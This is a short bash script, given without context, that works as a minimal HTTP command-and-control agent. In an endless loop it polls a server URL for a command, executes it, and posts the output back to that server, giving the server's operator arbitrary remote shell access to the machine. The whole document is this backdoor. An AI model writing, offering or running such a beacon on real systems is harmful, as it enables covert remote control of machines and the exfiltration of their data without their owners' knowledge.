URL=$1
echo $URL
while :
do
    COMMAND=`curl -s $URL/poll`
    OUTPUT=$($COMMAND)
    curl -s -d "$OUTPUT" $URL/output
    echo $OUTPUT
done

